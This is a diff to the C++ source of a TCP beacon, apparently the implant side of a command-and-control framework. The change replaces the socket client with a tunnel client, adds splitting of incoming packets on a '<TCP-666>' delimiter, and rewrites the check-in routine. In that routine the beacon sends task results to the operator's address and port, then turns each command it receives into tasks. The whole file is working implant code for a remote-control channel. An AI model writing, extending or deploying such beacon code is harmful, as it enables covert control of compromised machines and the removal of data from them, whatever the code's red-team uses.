@@ -1,13 +1,12 @@
 #include "BeaconTcp.hpp"
 
 using namespace std;
-using namespace SocketHandler;
 
 
 BeaconTcp::BeaconTcp(std::string& ip, int port)
 	: Beacon(ip, port)
 {
-	m_client=new Client(m_ip, m_port);
+	m_client=new SocketTunnelClient();
 }
 
 
@@ -17,41 +16,54 @@ BeaconTcp::~BeaconTcp()
 }
 
 
+int BeaconTcp::splitInPacket(const std::string& input, std::vector<std::string>& output) 
+{
+    std::string delimiter = "<TCP-666>";
+    size_t pos = 0;
+    size_t start = 0;
+
+    while ((pos = input.find(delimiter, start)) != std::string::npos) {
+        output.push_back(input.substr(start, pos - start));
+        start = pos + delimiter.length();
+    }
+
+    if (start < input.length()) 
+	{
+        output.push_back(input.substr(start));
+    }
+
+    return output.size();
+}
+
+
 void BeaconTcp::checkIn()
 {	
-	SPDLOG_DEBUG("initConnection");
-	while(!m_client->initConnection())
+	int ret = m_client->init(m_ip, m_port);
+
+	if(ret)
 	{
-		std::this_thread::sleep_for(std::chrono::milliseconds(333));
-		SPDLOG_DEBUG("initConnection");
-	}
+		std::string output;
+		taskResultsToCmd(output);
 
-	std::string output;
-	taskResultsToCmd(output);
+		output.append("<TCP-666>");
 
-	SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));
+		std::string input;
+		int res = m_client->process(output, input);
 
-	bool res = m_client->sendData(output);
-	if(res)
-	{
-		string input;
-		res=m_client->receive(input);
-		if(res)
+		if(res<0)
 		{
-			SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
-
-			if(!input.empty())
-			{
-				cmdToTasks(input);
-			}
+			m_client->reset();
 		}
-		else
-			SPDLOG_DEBUG("Receive failed");
-	}
-	else
-		SPDLOG_DEBUG("Send failed");
+		else if(!input.empty())
+		{
+			std::vector<std::string> trames;
+			splitInPacket(input, trames);
 
-	m_client->closeConnection();
+			for(int i=0; i<trames.size(); i++)
+				cmdToTasks(trames[i]);
+		}
+
+	}
 }
 
 	
